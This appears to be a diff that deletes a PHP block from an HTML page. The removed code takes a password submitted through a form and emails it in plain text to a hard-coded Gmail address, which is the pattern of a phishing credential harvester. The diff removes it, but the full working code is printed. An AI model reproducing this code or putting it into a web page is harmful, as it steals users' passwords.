@@ -1,30 +1,3 @@
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Coleta os dados do formulário
-    $senha = htmlspecialchars($_POST['senha']);
-
-    // Aqui você pode realizar a validação da senha, por exemplo, verificando se ela atende aos requisitos de segurança.
-    
-    // Destinatário do e-mail
-    $destinatario = "fxio0909@gmail.com";
-    $assunto = "Novo Contato";
-
-    // Corpo do e-mail
-    $corpo = "Senha: $senha";
-
-    // Cabeçalhos do e-mail
-    $cabecalhos = "From: contato@seudominio.com";
-
-    // Envia o e-mail
-    if (mail($destinatario, $assunto, $corpo, $cabecalhos)) {
-        echo "Mensagem enviada com sucesso!";
-    } else {
-        echo "Ocorreu um erro ao enviar a mensagem.";
-    }
-}
-?>
-
-<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
